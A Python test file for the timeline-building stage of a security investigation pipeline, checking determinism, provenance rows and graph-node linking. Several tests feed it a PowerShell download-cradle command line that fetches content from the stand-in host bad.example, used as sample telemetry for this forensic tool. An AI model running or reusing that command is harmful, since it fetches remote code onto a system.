"""Stage 9 · Timeline Builder tests.

Contract under test (owner directive 2026-08-02 + 2026-02-XX):
    Timeline is a **renderer** over validated evidence, not an
    inference engine. It may sort, group, annotate, and link
    evidence — never invent, guess, or synthesise events.

    Every entry is a `TimelineEvent` (canonical contract) that
    answers *why does this event exist?* via structured
    ProvenanceEntry rows — not just *what happened?*
"""
from __future__ import annotations

import json

from nivxforge.investigation.pipeline.artifact_discovery import discover
from nivxforge.investigation.pipeline.evidence_extraction import extract
from nivxforge.investigation.pipeline.graph_builder import build as build_graph
from nivxforge.investigation.pipeline.input_classification import classify_input
from nivxforge.investigation.pipeline.normalizers import normalize
from nivxforge.investigation.pipeline.parser import parse_input
from nivxforge.investigation.pipeline.recursive_decoder import decode
from nivxforge.investigation.pipeline.timeline_builder import (
    ProvenanceEntry, Timeline, TimelineEntry, TimelineEvent,
    build as build_timeline,
)
from nivxforge.investigation.pipeline.vendor_detection import detect_vendor


# ── Test helpers ─────────────────────────────────────────────────────

def _pipeline(raw: str):
    parsed = parse_input(raw, classify_input(raw))
    cem = normalize(parsed, detect_vendor(parsed))
    arts = discover(cem)
    layers = decode(arts)
    bundle = extract(cem, arts, layers)
    graph = build_graph(cem, bundle)
    tl = build_timeline(cem, graph)
    return tl, graph, cem


# ── Structural invariants ───────────────────────────────────────────

def test_timeline_returns_frozen_tuple():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    assert isinstance(tl, Timeline)
    assert isinstance(tl.entries, tuple)


def test_timeline_event_shape_is_stable():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        assert isinstance(e, TimelineEvent)
        assert e.source_event
        assert e.kind
        assert e.action
        assert e.event_type
        assert e.timestamp_precision in ("exact", "unknown")
        assert e.timestamp_source in ("CEM.event.timestamp", "unavailable")
        # provenance is a tuple of ProvenanceEntry rows
        assert isinstance(e.provenance, tuple)
        assert all(isinstance(p, ProvenanceEntry) for p in e.provenance)


def test_legacy_alias_matches_canonical_type():
    """TimelineEntry legacy import must resolve to TimelineEvent."""
    assert TimelineEntry is TimelineEvent


# ── Contract: renderer, not inference engine ─────────────────────────

def test_every_entry_references_existing_graph_nodes():
    """No phantom node ids allowed — actor, targets AND artifacts."""
    tl, graph, _ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    node_ids = {n.id for n in graph.nodes}
    for e in tl.entries:
        if e.actor is not None:
            assert e.actor in node_ids, f"phantom actor {e.actor}"
        for t in e.targets:
            assert t in node_ids, f"phantom target {t}"
        for a in e.artifacts:
            assert a in node_ids, f"phantom artifact {a}"
        for s in e.source_nodes:
            assert s in node_ids, f"phantom source_node {s}"


def test_every_entry_references_existing_cem_event():
    tl, _, cem = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    event_ids = {ev.event_id for ev in cem.events}
    for e in tl.entries:
        assert e.source_event in event_ids


def test_action_verbs_are_deterministic_and_never_invented():
    """Action strings must come from the fixed EventKind→verb map."""
    from nivxforge.investigation.pipeline.timeline_builder import (
        _VERB_BY_KIND,
    )
    allowed = set(_VERB_BY_KIND.values())
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        assert e.action in allowed, f"unexpected verb {e.action}"


def test_event_types_are_canonical_never_freeform():
    """event_type is a fixed label — Attack Chain reads this field."""
    from nivxforge.investigation.pipeline.timeline_builder import (
        _EVENT_TYPE_BY_KIND,
    )
    allowed = set(_EVENT_TYPE_BY_KIND.values())
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        assert e.event_type in allowed


def test_summary_is_deterministic_string_only():
    """Same input → identical summary."""
    payload = json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    })
    tl_a, *_ = _pipeline(payload)
    tl_b, *_ = _pipeline(payload)
    assert [e.summary for e in tl_a.entries] == \
           [e.summary for e in tl_b.entries]


# ── Determinism ──────────────────────────────────────────────────────

def test_same_cem_and_graph_yield_byte_identical_timeline():
    """Determinism contract: build() is a pure function of (CEM, Graph)."""
    _, graph, cem = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "powershell.exe",
        "CommandLine": "powershell -c whoami",
    }))
    a = build_timeline(cem, graph).to_dict()
    b = build_timeline(cem, graph).to_dict()
    assert a == b


def test_entries_sorted_chronologically_with_unknown_last():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    prev_ts = None
    seen_unknown = False
    for e in tl.entries:
        if e.timestamp is None:
            seen_unknown = True
            continue
        assert not seen_unknown, "known-time entry after unknown-time entry"
        if prev_ts is not None:
            assert e.timestamp >= prev_ts
        prev_ts = e.timestamp


# ── Provenance-first invariants ──────────────────────────────────────

def test_source_event_present_on_every_entry():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        assert e.source_event


def test_provenance_always_starts_with_cem_event_row():
    """Every entry must carry a Telemetry provenance row that cites
    the exact CEM event_id — this is the "why does this event exist?"
    grounding the owner asked for on 2026-02-XX."""
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        assert e.provenance, "entry with no provenance rows"
        first = e.provenance[0]
        assert first.origin == "Telemetry"
        assert first.source == f"CEM.event[{e.source_event}]"
        assert first.reason, "empty reason string"


def test_decoded_artifacts_produce_second_provenance_row():
    """When artifacts are linked via graph edges, a Decoded provenance
    row must accompany the Telemetry row so analysts can trace back to
    exactly the graph edge that annotated the entry."""
    tl, graph, _ = _pipeline(json.dumps({
        "EventID": 3, "Computer": "host-x",
        "Image": "powershell.exe",
        "CommandLine": (
            "powershell -c (New-Object Net.WebClient)"
            ".DownloadString('http://bad.example/p')"
        ),
    }))
    entries_with_artifacts = [e for e in tl.entries if e.artifacts]
    assert entries_with_artifacts, "expected artefact-bearing entry"
    for e in entries_with_artifacts:
        origins = [p.origin for p in e.provenance]
        assert "Decoded" in origins, (
            "artefact-bearing entry lacks Decoded provenance row")


def test_timestamp_source_matches_precision():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        if e.timestamp_precision == "exact":
            assert e.timestamp_source == "CEM.event.timestamp"
        else:
            assert e.timestamp_source == "unavailable"


def test_confidence_is_minimum_across_provenance_rows():
    """The entry-level confidence never overstates the weakest row."""
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        min_row = min(p.confidence for p in e.provenance)
        assert e.confidence == min_row


# ── Targets vs Artifacts contract ────────────────────────────────────

def test_targets_hold_direct_cem_objects_and_artifacts_hold_linked_iocs():
    """A CEM network_connect names the URL directly (target). A
    process_create that only *contains* a URL inside its command line
    surfaces the URL as an artifact via a graph edge."""
    tl, graph, _ = _pipeline(json.dumps({
        "EventID": 3, "Computer": "host-x",
        "Image": "powershell.exe",
        "CommandLine": (
            "powershell -c (New-Object Net.WebClient)"
            ".DownloadString('http://bad.example/p')"
        ),
    }))
    url_ids = {n.id for n in graph.nodes if n.kind == "url"}
    assert url_ids, "graph produced no url node"
    # The URL must land in artifacts (extracted from decoded command),
    # NOT in targets (which are direct CEM event fields only).
    all_targets = {t for e in tl.entries for t in e.targets}
    all_artifacts = {a for e in tl.entries for a in e.artifacts}
    assert not (url_ids & all_targets), (
        "URL should be artifact, not target, for process_create")
    assert url_ids & all_artifacts, "URL should appear as artifact"


# ── Serialization ────────────────────────────────────────────────────

def test_to_dict_returns_json_serialisable_shape():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    d = tl.to_dict()
    round_tripped = json.loads(json.dumps(d))
    assert round_tripped == d
    assert "entries" in d
    assert "time_span" in d
    assert "unknown_time_count" in d
    assert d["entry_count"] == len(d["entries"])
    for row in d["entries"]:
        # Canonical schema fields must all be present
        for key in ("id", "source_event", "timestamp",
                    "timestamp_precision", "timestamp_source",
                    "event_type", "kind", "action", "actor",
                    "targets", "artifacts", "source_nodes",
                    "summary", "provenance", "confidence"):
            assert key in row, f"missing canonical field {key}"


# ── Coverage: does the timeline reflect graph reality? ───────────────

def test_process_events_become_process_entries():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    kinds = {e.kind for e in tl.entries}
    assert "process" in kinds


# ── Non-invention guard ──────────────────────────────────────────────

def test_empty_cem_produces_empty_timeline():
    """No events → no entries. The renderer cannot invent evidence."""
    from datetime import datetime, timezone
    from nivxforge.investigation.cem import (
        CanonicalEventModel, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import (
        InvestigationGraph,
    )
    cem = CanonicalEventModel(
        vendor="test", vendor_route="unit",
        provenance=Provenance(source="unit-test",
                               timestamp=datetime.now(timezone.utc)),
    )
    graph = InvestigationGraph(nodes=(), edges=())
    tl = build_timeline(cem, graph)
    assert tl.entries == ()
    assert tl.unknown_time_count == 0
    assert tl.time_span == {"first": None, "last": None}


def test_event_without_graph_anchor_is_dropped():
    """A CEM event that has no graph representation must be skipped."""
    from datetime import datetime, timezone
    from nivxforge.investigation.cem import (
        CanonicalEvent, CanonicalEventModel, EventKind, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import (
        InvestigationGraph,
    )
    prov = Provenance(source="unit-test",
                      timestamp=datetime.now(timezone.utc))
    cem = CanonicalEventModel(
        vendor="test", vendor_route="unit",
        provenance=prov,
        events=[CanonicalEvent(event_id="e1", kind=EventKind.generic,
                                provenance=prov)],
    )
    graph = InvestigationGraph(nodes=(), edges=())
    tl = build_timeline(cem, graph)
    assert tl.entries == ()


# ── Chronological ordering across multi-event CEMs ───────────────────

def _fabricate(cem_events, nodes=(), edges=()):
    from datetime import datetime, timezone
    from nivxforge.investigation.cem import (
        CanonicalEventModel, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import (
        InvestigationGraph,
    )
    prov = Provenance(source="unit-test",
                      timestamp=datetime.now(timezone.utc))
    return (
        CanonicalEventModel(vendor="test", vendor_route="unit",
                             provenance=prov, events=cem_events),
        InvestigationGraph(nodes=tuple(nodes), edges=tuple(edges)),
    )


def test_multi_event_timeline_orders_chronologically():
    from datetime import datetime, timedelta, timezone
    import hashlib
    from nivxforge.investigation.cem import (
        CanonicalEvent, EventKind, Process, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import GraphNode

    prov = Provenance(source="unit-test",
                      timestamp=datetime.now(timezone.utc))
    t0 = datetime(2026, 2, 1, 12, 0, 0, tzinfo=timezone.utc)

    def _process_node(image: str) -> GraphNode:
        h = hashlib.sha256(image.encode()).hexdigest()[:12]
        return GraphNode(id=f"process-{h}", kind="process",
                          label=f"PROCESS · {image}", value=image)

    events = []
    for i, (offset, image) in enumerate([
        (2, "c.exe"), (0, "a.exe"), (1, "b.exe"),
    ]):
        events.append(CanonicalEvent(
            event_id=f"e{i}", kind=EventKind.process_create,
            timestamp=t0 + timedelta(seconds=offset),
            process=Process(image=image, provenance=prov),
            provenance=prov,
        ))
    cem, _ = _fabricate(events)
    nodes = tuple(_process_node(img) for img in ("a.exe", "b.exe", "c.exe"))
    _, graph = _fabricate(events, nodes=nodes)

    tl = build_timeline(cem, graph)
    assert len(tl.entries) == 3
    images_in_order = [
        graph.node(e.actor).value for e in tl.entries
    ]
    assert images_in_order == ["a.exe", "b.exe", "c.exe"]
    assert tl.time_span["first"] == t0.isoformat()
    assert tl.time_span["last"] == (t0 + timedelta(seconds=2)).isoformat()
    assert tl.unknown_time_count == 0


def test_mixed_known_and_unknown_timestamps_grouped_correctly():
    from datetime import datetime, timezone
    import hashlib
    from nivxforge.investigation.cem import (
        CanonicalEvent, EventKind, Process, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import GraphNode

    prov = Provenance(source="unit-test",
                      timestamp=datetime.now(timezone.utc))

    def _node(image: str) -> GraphNode:
        h = hashlib.sha256(image.encode()).hexdigest()[:12]
        return GraphNode(id=f"process-{h}", kind="process",
                          label=f"PROCESS · {image}", value=image)

    events = [
        CanonicalEvent(event_id="known",
                        kind=EventKind.process_create,
                        timestamp=datetime(2026, 2, 1, 12, 0, 0,
                                           tzinfo=timezone.utc),
                        process=Process(image="known.exe",
                                        provenance=prov),
                        provenance=prov),
        CanonicalEvent(event_id="unknown",
                        kind=EventKind.process_create,
                        process=Process(image="unknown.exe",
                                        provenance=prov),
                        provenance=prov),
    ]
    cem, _ = _fabricate(events)
    _, graph = _fabricate(events,
                           nodes=(_node("known.exe"),
                                  _node("unknown.exe")))

    tl = build_timeline(cem, graph)
    assert len(tl.entries) == 2
    assert tl.entries[0].timestamp_precision == "exact"
    assert tl.entries[1].timestamp_precision == "unknown"
    assert tl.unknown_time_count == 1


def test_actor_is_never_listed_as_its_own_target_or_artifact():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "powershell.exe",
        "CommandLine": (
            "powershell -c (New-Object Net.WebClient)"
            ".DownloadString('http://bad.example/p')"
        ),
    }))
    for e in tl.entries:
        assert e.actor not in e.targets
        assert e.actor not in e.artifacts


def test_source_nodes_are_unique_per_entry():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "powershell.exe",
        "CommandLine": (
            "powershell -c (New-Object Net.WebClient)"
            ".DownloadString('http://bad.example/p')"
        ),
    }))
    for e in tl.entries:
        assert len(e.source_nodes) == len(set(e.source_nodes))
